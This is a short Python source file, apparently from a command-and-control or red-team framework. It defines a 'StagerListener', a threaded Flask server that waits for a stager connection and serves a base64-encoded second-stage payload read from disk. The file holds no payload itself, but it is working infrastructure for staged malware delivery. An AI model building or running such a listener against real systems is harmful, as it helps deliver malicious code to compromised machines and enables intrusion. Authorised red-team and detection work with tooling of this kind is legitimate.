import os
import threading
import base64
from flask import Flask, request
from werkzeug.serving import make_server

class StagerListener():
    """
    This is the stager listener. It waits for
    a stager connection and gives it the second stage payload.
    """

    def __init__(self, ip, port, secondStagePath):
        self._ip = ip
        self._port = port
        self._secondStagePath = secondStagePath
        self.app = Flask(__name__)
        self.isRunning = False
        self.server = None
        self.thread = None

        if not os.path.exists(self._secondStagePath):
            print("[Stager Listener] Error: The second stage path doesn't exist!\n")

        self._register_routes()
    
    # Public methods
    def getPort(self):
        return self._port
    
    def getIp(self):
        return self._ip

    # Private methods
    def _register_routes(self):
        """
        Register Flask routes.
        """
        @self.app.route("/", methods=['GET'])
        def sendSecondStage():
            try:
                with open(self._secondStagePath, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                    return content, 200
            except FileNotFoundError:
                return "error", 404

    def run(self):
        self.server = make_server(self._ip, self._port, self.app)
        self.server.serve_forever()

    def start(self):
        """
        Start the Flask app in a background thread.
        """
        self.thread = threading.Thread(target=self.run)
        self.thread.start()
        self.isRunning = True

    def stop(self):
        """
        Stop the Flask server cleanly.
        """
        if self.server:
            self.server.shutdown()
        if self.thread:
            self.thread.join()
        self.isRunning = False
